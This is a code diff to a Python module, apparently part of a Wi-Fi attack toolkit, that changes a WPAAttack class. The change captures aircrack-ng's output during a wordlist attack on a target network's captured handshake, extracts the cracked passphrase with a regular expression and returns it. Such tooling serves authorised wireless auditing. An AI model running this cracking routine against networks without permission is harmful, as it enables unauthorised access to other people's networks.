@@ -1,6 +1,7 @@
 import subprocess
 import os
 import time
+import re
 from ..core.ui import print_status, print_success, print_error, print_warning
 from ..core.config import Config
 
@@ -56,8 +57,20 @@ class WPAAttack:
                 return
         
         print_status(f"Starting cracking process using: {wordlist}")
-        subprocess.run([
+        result = subprocess.run([
             'aircrack-ng', '-w', wordlist,
             '-b', self.target.bssid,
             cap_path
-        ])
+        ], capture_output=True, text=True)
+        
+        print(result.stdout)
+        
+        # Parse output for KEY FOUND!
+        match = re.search(r"KEY FOUND! \[ (.*) \]", result.stdout)
+        if match:
+            password = match.group(1)
+            print_success(f"Password Found: {password}")
+            return password
+        else:
+            print_error("Password not found in wordlist.")
+            return None
